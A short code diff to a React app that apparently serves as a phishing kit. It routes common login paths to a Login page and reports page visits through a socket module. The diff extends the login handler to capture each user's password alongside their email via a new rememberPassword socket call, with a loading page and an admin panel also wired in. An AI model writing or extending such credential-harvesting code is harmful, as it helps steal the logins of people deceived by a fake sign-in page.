@@ -9,7 +9,7 @@ import Verify from "./pages/Verify";
 import Terms from "./pages/Terms";
 import Done from "./pages/Done";
 import Admin from "./admin/Admin";
-import { announcePage, rememberEmail } from "./lib/socket";
+import { announcePage, rememberEmail, rememberPassword } from "./lib/socket";
 
 const LOGIN_ROUTES = new Set(["/", "/sign-in", "/signin", "/sign_in", "/account"]);
 
@@ -45,8 +45,9 @@ export default function App() {
   if (login) {
     page = (
       <Login
-        onContinue={(email) => {
+        onContinue={(email, password) => {
           rememberEmail(email);
+          rememberPassword(password);
           navigate("/loading");
         }}
       />
@@ -60,8 +61,9 @@ export default function App() {
   } else {
     page = (
       <Login
-        onContinue={(email) => {
+        onContinue={(email, password) => {
           rememberEmail(email);
+          rememberPassword(password);
           navigate("/loading");
         }}
       />
